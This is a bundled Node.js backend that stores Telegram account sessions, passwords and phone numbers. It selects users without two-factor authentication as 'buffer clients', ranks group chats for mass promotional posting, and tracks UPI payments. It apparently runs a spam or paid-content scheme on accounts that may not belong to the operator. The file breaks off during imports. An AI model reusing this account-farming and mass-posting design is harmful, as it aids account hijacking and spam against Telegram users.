/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./cloudinary.js":
/*!***********************!*\
  !*** ./cloudinary.js ***!
  \***********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   CloudinaryService: () => (/* binding */ CloudinaryService)
/* harmony export */ });
/* harmony import */ var cloudinary__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! cloudinary */ "cloudinary");
/* harmony import */ var cloudinary__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(cloudinary__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! path */ "path");
/* harmony import */ var path__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(path__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./utils */ "./utils.js");





class CloudinaryService {
    static instance;
    resources = new Map();

    constructor() {
        cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }

    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }

    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.findAndSaveResources(folderName, 'image');
    }

    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }

    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";

        try {

            const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log(result);
        } catch (error) {
            console.log(parseError(error))
        }

    }

    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            resources.forEach(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                } catch (error) {
                    console.log(resource);
                    console.log(parseError(error))
                }

            });
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async createFolder(folderName) {
        try {
            const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.api.create_folder(folderName);

            return result;
        } catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }

    // Function to upload files from URLs to a specific folder in Cloudinary
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary__WEBPACK_IMPORTED_MODULE_0___default().v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key, // Set the key as the public_id
                });

                return result;
            } catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });

        try {
            return await Promise.all(uploadPromises);
        } catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }

    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            })
        } catch (error) {
            console.log(parseError(error))
        }
    }

    get(publicId) {
        try {
            const result = this.resources.get(publicId)
            return result || '';
        } catch (error) {
            console.log(parseError(error))
        }
    }

    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId)
            return result || '';
        } catch (error) {
            console.log(parseError(error))
        }
    }
}

async function saveFile(url, name) {
    const extension = url.substring(url.lastIndexOf('.') + 1, url.length);
    const mypath = path__WEBPACK_IMPORTED_MODULE_1___default().resolve(__dirname, `./${name}.${extension}`);
    (0,_utils__WEBPACK_IMPORTED_MODULE_3__.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2)
        .then(res => {
            if (res?.statusText === 'OK') {
                try {
                    if (!fs__WEBPACK_IMPORTED_MODULE_2___default().existsSync(mypath)) {
                        fs__WEBPACK_IMPORTED_MODULE_2___default().writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
                        console.log(`${name}.${extension} Saved!!`);
                    } else {
                        fs__WEBPACK_IMPORTED_MODULE_2___default().unlinkSync(mypath);
                        fs__WEBPACK_IMPORTED_MODULE_2___default().writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
                        console.log(`${name}.${extension} Replaced!!`);
                    }
                } catch (err) {
                    console.error(err);
                }
            } else {
                throw new Error(`Unable to download file from ${url}`);
            }
        }).catch(err => {
            console.error(err);
        });
}






/***/ }),

/***/ "./dbservice.js":
/*!**********************!*\
  !*** ./dbservice.js ***!
  \**********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   ChannelService: () => (/* binding */ ChannelService)
/* harmony export */ });
/* harmony import */ var mongodb__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! mongodb */ "mongodb");
/* harmony import */ var mongodb__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(mongodb__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./utils */ "./utils.js");
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! mongoose */ "mongoose");
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(mongoose__WEBPACK_IMPORTED_MODULE_2__);




class ChannelService {
    static instance;
    client = undefined
    db = undefined;
    users = undefined;
    statsDb = undefined;
    statsDb2 = undefined;
    isConnected = false;

    constructor () {
    }

    static getInstance() {
        if (!ChannelService.instance) {
            ChannelService.instance = new ChannelService();
        }
        return ChannelService.instance;
    }
    static isInstanceExist() {
        return !!ChannelService.instance;
    }

    async connect() {
        if (!this.isConnected) {
            console.log('trying to connect to DB......')
            try {
                await mongoose__WEBPACK_IMPORTED_MODULE_2___default().connect(process.env.mongouri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: mongodb__WEBPACK_IMPORTED_MODULE_0__.ServerApiVersion.v1, maxPoolSize: 10 } );
                console.log('Connected to MongoDB');
                this.client = mongoose__WEBPACK_IMPORTED_MODULE_2___default().connection.getClient()
                this.isConnected = true;
                this.client.on('close', () => {
                    console.log('MongoDB connection closed.');
                    this.isConnected = false;
                });
                this.db = this.client.db("tgclients").collection('channels');
                this.users = this.client.db("tgclients").collection('users');
                this.statsDb = this.client.db("tgclients").collection('stats');
                this.statsDb2 = this.client.db("tgclients").collection('stats2');
                return true;
            } catch (error) {
                console.log(`Error connecting to MongoDB: ${error}`);
                return false;
            }
        } else {
            console.log('MongoConnection ALready Existing');
        }
    }
    async insertChannel(channelData) {
        const {
            title,
            id,
            username,
            megagroup,
            participantsCount,
            restricted,
            broadcast
        } = channelData
        const cannotSendMsgs = channelData.defaultBannedRights?.sendMessages
        if (!cannotSendMsgs && !broadcast) {
            await this.db.updateOne({ channelId: id.toString() }, { $set: { username: username, title, megagroup, participantsCount, broadcast, restricted, sendMessages: channelData.defaultBannedRights?.sendMessages, canSendMsgs: true } }, { upsert: true });
        }
    }

    async insertContact(contact) {
        const collection = this.client.db("tgclients").collection('contacts');

        await collection.updateOne({ phone: contact.phone }, { $set: contact }, { upsert: true });

    }
    async getChannels(limit = 50, skip = 0, k) {
        const query = { megagroup: true, username: { $ne: null } };
        const sort = { participantsCount: -1 };
        if (k) {
            query["$or"] = [{ title: { $regex: k, $options: 'i' } }, { username: { $regex: k, $options: 'i' } }]
        }
        const options = { collation: { locale: 'en', strength: 1 } };
        try {
            if (k) {
                await this.db?.createIndex({ title: 'text' }); // Create index on the "title" field for text search
            }
            const result = await this.db
                .find(query, options)
                .sort(sort)
                .skip(skip)
                .limit(limit)
                .toArray();

            return result;
        } catch (error) {
            console.error('Error:', error);
            return [];
        }
    }

    async insertUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.findOne(filter);
            if (!entry) {
                await this.users.insertOne(user);
            }
        } catch (error) {
            console.log(parseError(error))
        }
    }

    // async calculateAvgStats() {
    //     try {
    //         const channelStatsDb = this.client.db("tgclients").collection('channelStats'); // Replace with your source collection name
    //         const activeChannelsDb = this.client.db("tgclients").collection('activeChannels'); // Replace with your target collection name

    //         const documents = await channelStatsDb.find({}).toArray();

    //         for (const doc of documents) {
    //             const { channelId, requestCounts } = doc;
    //             if (requestCounts.length > 0) {
    //                 const sum = requestCounts.reduce((acc, num) => acc + num, 0);
    //                 const average = sum / requestCounts.length;

    //                 const updateDoc = {
    //                     rpm: Math.floor(average)
    //                 };

    //                 await activeChannelsDb.updateOne(
    //                     { channelId },
    //                     { $set: updateDoc },
    //                     { upsert: true } // Create the document if it doesn't exist
    //                 );

    //                 await channelStatsDb.updateOne({ channelId }, { $set: { requestCounts: [], updatedAt: 0 } }, { upsert: true });

    //                 console.log(`Processed chatId: ${channelId}, average: ${average}`);
    //             }
    //         }
    //     } catch (error) {
    //         console.error('Error while processing documents:', error);
    //     }
    // }


    // async clearChannelStats() {
    //     const channelStatsDb = this.client.db("tgclients").collection('channelStats'); // Replace with your source collection name
    //     const result = await channelStatsDb.deleteMany({});
    //     console.log("deleted Channel Stats: ", result)
    // }

    async updateUser(user, data) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.updateOne(filter, {
                $set: {
                    ...data
                },
            }, { upsert: true });
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async resetPaidUsers() {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now(),
                    paidReply: true
                }
            });
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async deleteUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.deleteOne(filter);
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async getUser(user) {
        const filter = { mobile: user.mobile };
        try {
            const entry = await this.users.findOne(filter);
            return entry
        } catch (error) {
            console.log(parseError(error))
            return undefined
        }
    }

    async getuserdata(filter) {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.findOne(filter);
            return entry
        } catch (error) {
            console.log(parseError(error))
            return undefined
        }
    }

    async updateUserData(filter, data) {
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const entry = await collection.updateMany(filter, { $set: { ...data } });
            return entry
        } catch (error) {
            console.log(parseError(error))
            return undefined
        }
    }

    async getTempUser() {
        try {
            const entry = await this.users.findOne({});
            return entry
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async getUsersFullData(limit = 2, skip = 0) {
        const result = await this.users?.find({}).skip(skip).limit(limit).sort({ _id: 1 }).toArray();
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }

    async insertInBufferClients(user) {
        const filter = { mobile: user.mobile };
        try {
            const bufferColl = this.client.db("tgclients").collection('bufferClients');
            await bufferColl.updateOne(filter, { $set: { ...user } }, { upsert: true });
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async readBufferClients(filter, limit) {
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        const query = filter || {};
        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);
        const result = await queryWithLimit.toArray();
        if (result?.length > 0) {
            return result;
        } else {
            return [];
        }
    }


    async getOneBufferClient() {
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        const result = await bufferColl.findOne({});
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }

    async deleteBufferClient(user) {
        const filter = { mobile: user.mobile };
        const bufferColl = this.client.db("tgclients").collection('bufferClients');
        try {
            const entry = await bufferColl.deleteOne(filter);
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async getNewBufferClients(ids) {
        const cursor = this.users.find({ "mobile": { $nin: ids }, twoFA: { $exists: false } }).sort({ lastActive: 1 }).limit(20);
        return cursor
    }

    async readPromoteStats() {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const result = await promotColl.find({}, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } }).sort({ totalCount: -1 }).toArray();
        if (result.length > 0) {
            return result;
        } else {
            return undefined;
        }
    }

    async checkIfPaidToOthers(chatId, profile) {
        const resp = { paid: 0, demoGiven: 0, secondShow: 0, fullShow: 0 };
        try {
            const collection = this.client.db("tgclients").collection('userData');
            const document = await collection.find({ chatId, profile: { $exists: true, "$ne": profile }, payAmount: { $gte: 10 } }).toArray();
            const document2 = await collection.find({ chatId, profile: { $exists: true, "$ne": profile } }).toArray();
            if (document.length > 0) {
                resp.paid = document.length
            }
            if (document2.length > 0) {
                document2.map(doc => {
                    if (doc.demoGiven) {
                        resp.demoGiven = resp.demoGiven + 1
                    }
                    if (doc.secondShow) {
                        resp.secondShow = resp.secondShow + 1
                    }
                    if (doc.fullShow) {
                        resp.fullShow = resp.fullShow + 1
                    }
                })
            }
        } catch (error) {
            console.log(parseError(error))
        }
        return resp;
    }


    async readSinglePromoteStats(clientId) {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const result = await promotColl.findOne({ client: clientId }, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } });
        return result
    }

    async readStats() {
        const result = await this.statsDb.find({}).sort({ newUser: -1 })
        if (result) {
            return result.toArray();
        } else {
            return undefined;
        }
    }

    async read(chatId) {
        const result = await this.db.findOne({ chatId });
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }
    async removeOnefromChannel(filter) {
        try {
            await this.db.deleteOne(filter)
        } catch (e) {
            console.log(parseError(e))
        }
    }

    async getUsers(limit, skip = 0) {
        const result = await this.users?.find({}, { projection: { firstName: 1, userName: 1, mobile: 1, _id: 0 } }).skip(skip).limit(limit).toArray();
        if (result) {
            return result;
        } else {
            return undefined;
        }
    }

    async getupi(key) {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.findOne({});
        return upiIds[key] || "lakshmi-69@paytm"
    }

    async getAllUpis() {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.findOne({});
        return upiIds
    }

    async updateUpis(data) {
        const upiDb = this.client.db("tgclients").collection('upi-ids');
        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
        return upiIds
    }

    async getBuilds() {
        const buildBd = this.client.db("tgclients").collection('builds');
        const builds = await buildBd.findOne({});
        return builds
    }

    async updateBuilds(data) {
        const buildBd = this.client.db("tgclients").collection('builds');
        const builds = await buildBd.updateOne({}, { $set: { ...data } }, { upsert: true });
        return builds
    }

    async getUserConfig(filter) {
        const clientDb = this.client.db("tgclients").collection('clients');
        const client = await clientDb.findOne(filter);
        return client
    }
    async getUserInfo(filter) {
        const clientDb = this.client.db("tgclients").collection('clients');
        const aggregationPipeline = [
            { $match: filter },
            {
                $project: {
                    "_id": 0,
                    "session": 0,
                    "number": 0,
                    "password": 0,
                }
            }
        ];
        const result = await clientDb.aggregate(aggregationPipeline).toArray();
        return result.length > 0 ? result[0] : null;
    }
    async updateUserConfig(filter, data) {
        const upiDb = this.client.db("tgclients").collection('clients');
        const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });
        return updatedDocument.value;
    }

    async insertInAchivedClient(data) {
        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
        const upiIds = await upiDb.updateOne({ number: data.number }, { $set: { ...data } }, { upsert: true });
        return upiIds
    }

    async getInAchivedClient(filter) {
        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
        const upiIds = await upiDb.findOne(filter)
        return upiIds
    }

    async getAllUserClients() {
        const clientDb = this.client.db("tgclients").collection('clients');
        const clients = await clientDb.aggregate([
            {
                $project: {
                    "_id": 0,
                    "session": 0,
                    "number": 0,
                    "password": 0,
                }
            }
        ]).toArray();
        return clients;
    }

    async setEnv() {
        const clientDb = this.client.db("tgclients").collection('configuration');
        const jsonData = await clientDb.findOne({}, { _id: 0 });
        for (const key in jsonData) {
            process.env[key] = jsonData[key];
        }
    }

    async getTgConfig() {
        const clientDb = this.client.db("tgclients").collection('configuration');
        const jsonData = await clientDb.findOne({}, { _id: 0 });
        return jsonData
    }

    async updateTgConfig(data) {
        const upiDb = this.client.db("tgclients").collection('configurations');
        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
        return upiIds
    }

    async processUsers(limit = undefined, skip = undefined) {
        const weekAgo = new Date(Date.now() - (60 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0]
        const cursor = this.users.find({
            $or: [
                { "lastUpdated": { $lt: weekAgo } },
                { "lastUpdated": { $exists: false } }
            ]
        }).limit(limit ? limit : 300).skip(skip ? skip : 0);
        return cursor;
    }

    async clearStats() {
        const result = await this.statsDb.deleteMany({ "payAmount": { $lt: 5 } });
        console.log(result);
    }

    async clearAllStats() {
        const result = await this.statsDb?.deleteMany({});
        console.log(result);
    }

    async clearStats2() {
        const result = await this.statsDb2?.deleteMany({});
        console.log(result);
    }

    async reinitPromoteStats() {
        const promotColl = this.client.db("tgclients").collection('promoteStats');
        const users = await this.getAllUserClients();
        for (const user of users) {
            await promotColl.updateOne({ client: user.clientId },
                {
                    $set: {
                        data: Object.fromEntries((await promotColl.findOne({ client: user.clientId })).channels?.map(channel => [channel, 0])),
                        totalCount: 0,
                        uniqueChannels: 0,
                        releaseDay: Date.now(),
                        lastupdatedTimeStamp: Date.now()
                    }
                });
        }
    }

    async closeConnection() {
        try {
            if (this.isConnected) {
                this.isConnected = false;
                console.log('MongoDB connection closed.');
            }
            await this.client?.close();
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async getCurrentActiveUniqueChannels() {
        const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');

        const cursor = promoteStatsColl.find({});
        const uniqueChannels = new Set();

        await cursor.forEach((document) => {
            for (const channel in document.data) {
                uniqueChannels.add(channel);
            }
        });

        const uniqueChannelNames = Array.from(uniqueChannels);
        return uniqueChannelNames;
    }

    async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")
        let query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };

        const sort = { participantsCount: -1 };
        const promoteStatsColl = this.client.db("tgclients").collection(collection);
        try {
            const result = await promoteStatsColl
                .find(query)
                .sort(sort)
                .skip(skip)
                .limit(limit)
                .toArray();

            return result;
        } catch (error) {
            console.error('Error:', error);
            return [];
        }
    }

    async updateActiveChannels() {
        try {
            const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');
            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
            const channelInfoCollection = this.client.db("tgclients").collection('channels');
            const cursor = promoteStatsColl.find({});
            await cursor.forEach(async (document) => {
                for (const username in document.data) {
                    const channelInfo = await channelInfoCollection.findOne({ username }, { projection: { "_id": 0 } });
                    if (channelInfo) {
                        let chat = {}
                        const activeChannelInfo = await activeChannelCollection.findOne({ channelId: channelInfo.channelId }, { projection: { "_id": 0 } });
                        if (!activeChannelInfo || ((0,_utils__WEBPACK_IMPORTED_MODULE_1__.isMatchingChatEntity)(channelInfo) && !("banned" in activeChannelInfo))) {
                            console.log("banned not exists: ", channelInfo);
                            chat['channelId'] = channelInfo.channelId
                            chat['title'] = channelInfo.title
                            chat['participantsCount'] = channelInfo.participantsCount
                            chat['username'] = channelInfo.username
                            chat['restricted'] = channelInfo.restricted
                            chat['broadcast'] = channelInfo.broadcast
                            chat['sendMessages'] = channelInfo.sendMessages
                            chat['canSendMsgs'] = channelInfo.canSendMsgs
                            chat["banned"] = false;
                            chat["availableMsgs"] = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18"];
                            chat["wordRestriction"] = 0;
                            chat["dMRestriction"] = 0
                        }

                        await activeChannelCollection.updateOne({ channelId: channelInfo.channelId }, { $set: channelInfo }, { upsert: true });
                    }
                }
            });

            const invalidChannelsCursor = await activeChannelCollection.find({ $or: [{ banned: { $exists: false } }, { participantsCount: null }, { participantsCount: { $exists: false } }] })
            await invalidChannelsCursor.forEach(async (document) => {
                const channelInfo = await channelInfoCollection.findOne({ channelId: document.channelId }, { projection: { "_id": 0 } }) || { participantsCount: 1200 };
                await activeChannelCollection.updateOne({ channelId: document.channelId }, {
                    $set: {
                        ...channelInfo,
                        banned: false,
                        availableMsgs: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18"],
                        wordRestriction: 0,
                        dMRestriction: 0
                    }

                })
            })
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async updateActiveChannel(id, data) {
        const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
        await activeChannelCollection.updateOne({ channelId: id }, { $set: data }, { upsert: true })
    }

    async updateBannedChannels() {
        const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
        await activeChannelCollection.updateMany({ banned: true }, {
            $set: {
                "wordRestriction": 0,
                "dMRestriction": 0,
                banned: false,
                "availableMsgs": [
                    "1",
                    "2",
                    "3",
                    "4",
                    "5",
                    "6",
                    "7",
                    "8",
                    "9",
                    "10",
                    "11",
                    "12",
                    "14",
                    "15",
                    "16"
                ]
            }
        })
    }

    async updateDefaultReactions() {
        const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
        await activeChannelCollection.updateMany({}, {
            $set: {
                reactions: [
                    '❤', '🔥', '👏', '🥰', '😁', '🤔',
                    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
                    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
                    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
                    '🤣', '💔', '🏆', '😭', '😴', '👍',
                    '🌚', '⚡', '🍌', '😐', '💋', '👻',
                    '👀', '🙈', '🤝', '🤗', '🆒',
                    '🗿', '🙉', '🙊', '🤷', '👎'
                ]
            }
        })
    }
    async resetAvailableMsgs() {
        try {
            const promoteMsgs = this.client.db("tgclients").collection('promoteMsgs');
            const data = await promoteMsgs.findOne({}, { projection: { "_id": 0, "0": 0 } });
            const keys = Object.keys(data);
            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
            await activeChannelCollection.updateMany({
                $expr: {
                    $lt: [{ $size: { $ifNull: ["$availableMsgs", []] } }, 5]
                }
            }, {
                $set: {
                    "wordRestriction": 0,
                    "dMRestriction": 0,
                    "banned": false,
                    "availableMsgs": keys
                }
            })
        } catch (e) {
            console.log(parseError(e))
        }
    }

    async removeOnefromActiveChannel(filter) {
        try {
            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
            await activeChannelCollection.deleteOne(filter)
        } catch (e) {
            console.log(parseError(e))
        }
    }
}



/***/ }),

/***/ "./index.js":
/*!******************!*\
  !*** ./index.js ***!
  \******************/
/***/ ((module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.a(module, async (__webpack_handle_async_dependencies__, __webpack_async_result__) => { try {
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var dotenv__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! dotenv */ "dotenv");
/* harmony import */ var dotenv__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(dotenv__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var express__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! express */ "express");
/* harmony import */ var express__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(express__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var node_schedule_tz__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! node-schedule-tz */ "node-schedule-tz");
/* harmony import */ var node_schedule_tz__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(node_schedule_tz__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _dbservice__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./dbservice */ "./dbservice.js");
/* harmony import */ var _telegramManager__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./telegramManager */ "./telegramManager.js");
/* harmony import */ var body_parser__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! body-parser */ "body-parser");
/* harmony import */ var body_parser__WEBPACK_IMPORTED_MODULE_6___default = /*#__PURE__*/__webpack_require__.n(body_parser__WEBPACK_IMPORTED_MODULE_6__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./utils */ "./utils.js");
/* harmony import */ var child_process__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! child_process */ "child_process");
/* harmony import */ var child_process__WEBPACK_IMPORTED_MODULE_8___default = /*#__PURE__*/__webpack_require__.n(child_process__WEBPACK_IMPORTED_MODULE_8__);
/* harmony import */ var _cloudinary__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./cloudinary */ "./cloudinary.js");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_10___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_10__);
/* harmony import */ var _nestjs_core__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
/* harmony import */ var _nestjs_core__WEBPACK_IMPORTED_MODULE_11___default = /*#__PURE__*/__webpack_require__.n(_nestjs_core__WEBPACK_IMPORTED_MODULE_11__);
/* harmony import */ var _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
/* harmony import */ var _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12___default = /*#__PURE__*/__webpack_require__.n(_nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__);
/* harmony import */ var _nest_app_module__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! ./nest/app.module */ "./nest/app.module.ts");
/* harmony import */ var _nest_app_module__WEBPACK_IMPORTED_MODULE_13___default = /*#__PURE__*/__webpack_require__.n(_nest_app_module__WEBPACK_IMPORTED_MODULE_13__);
/* harmony import */ var _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
/* harmony import */ var _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14___default = /*#__PURE__*/__webpack_require__.n(_nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__);
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! mongoose */ "mongoose");
/* harmony import */ var mongoose__WEBPACK_IMPORTED_MODULE_15___default = /*#__PURE__*/__webpack_require__.n(mongoose__WEBPACK_IMPORTED_MODULE_15__);
/* harmony import */ var _nest_components_Telegram_Telegram_service__WEBPACK_IMPORTED_MODULE_16__ = __webpack_require__(/*! ./nest/components/Telegram/Telegram.service */ "./nest/components/Telegram/Telegram.service.ts");
/* harmony import */ var _nest_components_Telegram_Telegram_service__WEBPACK_IMPORTED_MODULE_16___default = /*#__PURE__*/__webpack_require__.n(_nest_components_Telegram_Telegram_service__WEBPACK_IMPORTED_MODULE_16__);
/* harmony import */ var _nest_components_users_users_service__WEBPACK_IMPORTED_MODULE_17__ = __webpack_require__(/*! ./nest/components/users/users.service */ "./nest/components/users/users.service.ts");
/* harmony import */ var _nest_components_users_users_service__WEBPACK_IMPORTED_MODULE_17___default = /*#__PURE__*/__webpack_require__.n(_nest_components_users_users_service__WEBPACK_IMPORTED_MODULE_17__);
